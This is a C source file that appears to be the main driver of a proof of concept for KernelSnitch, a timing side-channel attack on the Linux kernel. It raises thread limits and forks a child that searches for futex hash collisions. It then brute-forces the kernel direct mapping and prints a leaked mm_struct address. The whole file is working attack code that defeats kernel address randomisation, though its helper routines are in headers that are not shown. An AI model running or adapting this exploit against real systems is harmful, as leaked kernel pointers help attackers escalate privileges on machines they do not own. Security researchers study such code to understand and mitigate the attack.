    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <stddef.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    #include <linux/futex.h>
    #include <sys/types.h>
    #include <sys/time.h>
    #include <sys/wait.h>
    #include <signal.h>
    #include <time.h>
    #include <pthread.h>
    #include "utils.h"
    #include "kernelsnitch.h"
    
    #define MM_STRUCT_SZ 1152
    #define MM_ORDER 3
    
    int main() {
        set_limit();     // 1. Raise RLIMIT_NPROC so 4,096 threads can be created
        pin_to_core(0);  // 2. Lock to core 0 for low-noise cycle timing
    
        for (int i = 0; i < 20; i++) {
            struct kernelsnitch_shared_state *ks = kernelsnitch_setup(
                MM_STRUCT_SZ, MM_ORDER, sysconf(_SC_NPROCESSORS_ONLN), 8, 1, 0);
    
            pid_t child = fork();
            if (child == 0) {
                // Child runs collision search, then pauses
                kernelsnitch_find_collisions(ks);
                pause(); // Keep mm_struct alive while parent resolves the oracle
                _exit(0);
            }
    
            // Parent waits until child updates the state in shared memory
            while (ks->state == KERNELSNITCH_INIT) {
                usleep(1000);
            }
    
            if (!kernelsnitch_found_collisions(ks)) {
                pr_info("Could not find collisions on attempt [%d]\n", i);
                kill(child, SIGKILL);       // Kills child & frees all 4,096 threads
                waitpid(child, NULL, 0);
                kernelsnitch_cleanup(ks);
                continue;
            }
            
            
            // Run brute-force across the kernel direct-mapping
            kernelsnitch_bruteforce(ks);
    
            // Child is no longer needed; kill it to wipe all 4,096 threads
            kill(child, SIGKILL);
            waitpid(child, NULL, 0);
    
            uintptr_t leaked = ks->mm_struct;
            if (leaked == (uintptr_t)-1) {
                pr_info("KernelSnitch failed on attempt [%d]\n", i);
                kernelsnitch_cleanup(ks);
            } else {
                pr_info("[SUCCESS]: Leaked mm_struct: 0x%zx (Attempt %d)\n", leaked, i);
                
                kernelsnitch_cleanup(ks);
                break; // Successfully found mm_struct!
            }
        }
        return 0;
    }
